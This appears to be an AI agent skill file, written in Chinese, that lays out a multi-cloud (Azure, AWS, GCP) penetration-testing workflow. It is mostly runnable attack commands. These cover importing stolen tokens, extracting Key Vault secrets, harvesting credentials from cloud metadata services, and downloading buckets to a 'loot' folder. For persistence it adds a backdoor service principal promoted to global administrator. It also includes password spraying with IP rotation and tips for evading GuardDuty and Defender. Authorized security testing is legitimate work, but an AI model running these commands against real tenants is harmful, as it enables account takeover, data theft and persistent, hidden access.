---
name: cloud-penetration-testing
title: 多云基础设施渗透测试
description: 当需要对 Azure/AWS/GCP 云环境做授权安全评估时使用；做侦察、认证、资源枚举、提权、数据提取、持久化并产出评估报告与加固建议；不适用于无书面授权的测试、动产线客户数据或纯本地主机渗透；触发词：云渗透、Azure/AWS/GCP、IAM 枚举、元数据服务、密钥泄露
domain: 安全/ops
triggers: [云渗透测试, Azure 渗透, AWS 渗透, GCP 渗透, 多云安全评估, IAM 提权, S3 桶枚举, Key Vault 密钥, 元数据服务 SSRF, 云资源枚举, ScoutSuite, Pacu]
tags: [安全, 渗透测试, 云安全, Azure, AWS, GCP, IAM, 红队, misc]
level: 精通
status: stable
agents: [claude-code, codex, cursor, gemini-cli]
tools: [bash, powershell, az, aws-cli, gcloud, gsutil, kubectl, ScoutSuite, Pacu, curl]
requires: []
related: [aws-penetration-testing, cloud-misconfig-auditor, penetration-testing-methodology, active-directory-attacks]
combines_with: [red-team-recon, cloud-misconfig-auditor, penetration-testing-methodology]
license: MIT
source: sickn33/antigravity-awesome-skills
source_license: MIT
---
> 仅限授权使用：本技能只用于获得书面授权的安全评估、防御验证或受控教学环境。所有 API 操作均会被云端日志记录。

# 多云基础设施渗透测试

对 Microsoft Azure、AWS、GCP 三大公有云做端到端安全评估：侦察、认证、资源枚举、提权、数据提取与持久化。

## 何时使用

适用：
- 已取得**书面授权**、明确范围（scope）与交战规则（ROE）的云环境渗透。
- 防御侧做配置审计、攻击路径验证、应急演练。
- 受控教学/靶场环境练习云攻击链。

不该用（负边界）：
- 无书面授权、超出约定 scope 的任何测试。
- 访问或导出生产环境的真实客户数据。
- 纯本地主机/内网渗透（无云组件）——请用对应主机渗透技能。
- 跨账号越界（须严格尊重云账号间边界）。

前置条件：掌握云架构、IAM、API 认证、DevOps 基础；持有测试凭据/令牌；环境就绪。

## 步骤

总体攻击链：侦察 → 认证 → 枚举 → 利用 → 持久化，三朵云并行推进。

1. **侦察**：从公开信息识别目标云足迹（租户/域/IP 归属、桶名）。
2. **认证**：用合法凭据或窃取的上下文登录各云。
3. **枚举**：列订阅/项目、IAM 角色、计算、存储、数据库、K8s、Serverless。
4. **利用**：找错配——公开快照、Lambda 环境变量、Key Vault 密钥、元数据服务（IMDS/SSRF）。
5. **持久化**：后门服务主体、新增访问密钥/管理员（仅在授权范围内）。
6. **产出**：评估报告、资源清单、凭据发现、按平台加固建议。

## 指令

### 工具安装

```bash
# Azure（PowerShell 模块）
Install-Module -Name Az -AllowClobber -Force
Install-Module -Name MSOnline -Force
Install-Module -Name AzureAD -Force

# AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o awscliv2.zip
unzip awscliv2.zip && sudo ./aws/install

# GCP CLI
curl https://sdk.cloud.google.com | bash && gcloud init

# 多云审计/利用框架
pip install scoutsuite pacu
```

### 侦察

```bash
# Azure：联合身份与租户信息
curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"
curl "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"

# 按公司名枚举云资源 / 判定 IP 云归属
python3 cloud_enum.py -k targetcompany
cat ips.txt | python3 ip2provider.py
```

### Azure 认证 / 枚举 / 利用 / 持久化

```powershell
# 认证（凭据登录可能绕过 MFA；可导入/导出上下文做持久化）
Import-Module Az; Connect-AzAccount
$credential = Get-Credential; Connect-AzAccount -Credential $credential
Import-AzContext -Profile 'C:\Temp\StolenToken.json'
Save-AzContext -Path C:\Temp\AzureAccessToken.json
Import-Module MSOnline; Connect-MsolService

# 枚举
Get-AzContext -ListAvailable; Get-AzSubscription
Get-AzRoleAssignment                       # 当前用户角色
Get-AzResource; Get-AzStorageAccount; Get-AzWebApp; Get-AzSQLServer; Get-AzVM
Get-MsolUser -All; Get-MsolGroup -All
Get-MsolRole -RoleName "Company Administrator"   # 全局管理员
Get-MsolServicePrincipal

# 利用：遍历用户属性搜口令
$users = Get-MsolUser -All
foreach($user in $users){
  foreach($prop in ($user | Get-Member).Name){
    if($user.$prop -like "*password*"){
      Write-Output ("[*]"+$user.UserPrincipalName+"["+$prop+"] : "+$user.$prop)
    }
  }
}
# 在 VM 上执行命令 / 取 UserData
Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1
(Get-AzVM).UserData
# 抽取 Key Vault 密钥
az keyvault list --query '[].name' -o tsv
az keyvault set-policy --name <vault> --upn <user> --secret-permissions get list
az keyvault secret list --vault-name <vault> --query '[].id' -o tsv
az keyvault secret show --id <URI>

# 持久化：后门服务主体并提升至全局管理员
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
```

### AWS 认证 / 枚举 / 利用 / 持久化

```bash
# 认证
aws configure                 # 输入 AK/SK/Region/Output
aws sts get-caller-identity   # 验证凭据

# 枚举
aws iam list-users; aws iam list-roles
aws s3 ls; aws s3 sync s3://bucket-name ./local-dir
aws ec2 describe-instances
aws rds describe-db-instances --region us-east-1
aws lambda list-functions --region us-east-1
aws eks list-clusters --region us-east-1

# 利用：公开 RDS 快照 / Lambda 环境变量 / 元数据服务
aws rds describe-db-snapshots --snapshot-type manual
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>  # AttributeValues="all" 即公开
aws lambda get-function --function-name <name> | jq '.Configuration.Environment'
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/ -H "X-aws-ec2-metadata-token: $TOKEN"

# 持久化：后门访问密钥
aws iam list-access-keys --user-name <username>
aws iam create-access-key --user-name <username>
```

### GCP 认证 / 枚举 / 利用

```bash
# 认证
gcloud auth login
gcloud auth activate-service-account --key-file creds.json
gcloud auth list; gcloud config list

# 枚举
gcloud projects list; gcloud organizations list
gcloud projects get-iam-policy <project-id>
gcloud compute instances list
gsutil ls; gsutil ls -r gs://bucket-name; gsutil cp gs://bucket/file ./local
gcloud sql instances list
gcloud container clusters list
gcloud container clusters get-credentials <cluster> --region <region>; kubectl cluster-info

# 利用：元数据服务 / KMS 解密 / 翻找凭据
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"
gcloud kms decrypt --ciphertext-file=enc --plaintext-file=out.txt --key <key> --keyring <kr> --location global
sudo find /home -name "credentials.db"
sudo cp -r /home/user/.config/gcloud ~/.config; gcloud auth list
```

### 元数据服务地址速查

| 云 | URL |
|----|-----|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2018-02-01` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |

### 常用工具

ScoutSuite（多云审计）、Pacu（AWS 利用框架）、AzureHound/ROADTools（Azure AD 路径与枚举）、WeirdAAL（AWS 枚举）、MicroBurst/PowerZure（Azure 评估与后渗透）。

## 示例

**示例 1 — Azure 密码喷洒（配合 FireProx 轮换 IP）**

```powershell
python fire.py --access_key <key> --secret_access_key <secret> --region us-east-1 --url https://login.microsoft.com --command create
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\users.txt -Password "Spring2024!" -URL https://<api-gw>.execute-api.us-east-1.amazonaws.com/fireprox
```

**示例 2 — AWS S3 错配桶批量枚举与下载**

```bash
aws s3 ls | awk '{print $3}' > buckets.txt
while read bucket; do echo "Checking: $bucket"; aws s3 ls s3://$bucket 2>/dev/null; done < buckets.txt
aws s3 sync s3://misconfigured-bucket ./loot/
```

**示例 3 — GCP 服务账号被陷后横向移动**

```bash
gcloud auth activate-service-account --key-file compromised-sa.json
gcloud projects list
gcloud compute instances list --project target-project
gcloud compute project-info describe --project target-project | grep ssh
gcloud beta compute ssh instance-name --zone us-central1-a --project target-project
```

## 注意事项

法律：仅在明确书面授权下测试；严守 scope 与账号边界；不得访问生产客户数据；全程记录测试活动。

技术限制：MFA 与条件访问（Conditional Access）可能阻断凭据攻击；CloudTrail / Activity Log 记录全部 API；部分资源需特定区域访问。

检测规避：云端记录所有 API 活动，异常访问会触发告警——采用缓慢、克制的枚举节奏；留意 GuardDuty、Defender/Security Center、Cloud Armor。

排错速查：
- 认证失败 → 核对凭据/MFA/租户或项目，尝试其它认证方式。
- 权限不足 → 列当前角色，换资源，查资源策略与区域。
- 元数据被拦 → 检查 IMDSv2（AWS）、实例角色、对 169.254.169.254 的防火墙。
- 限流 → 加延时、跨区域分散、用多套凭据、聚焦高价值目标。

## 互见

- 进阶脚本（源仓库）：Azure Automation runbook、Function Apps 枚举、AWS 数据外带、GCP 高级利用——见源 `references/advanced-cloud-scripts.md`。
- 可结合 K8s/容器安全、IAM 提权专项技能进一步下钻。

---
采编自 sickn33/antigravity-awesome-skills（MIT 许可），原作者 zebbern。已适配重写为中文，保留关键命令与约束。
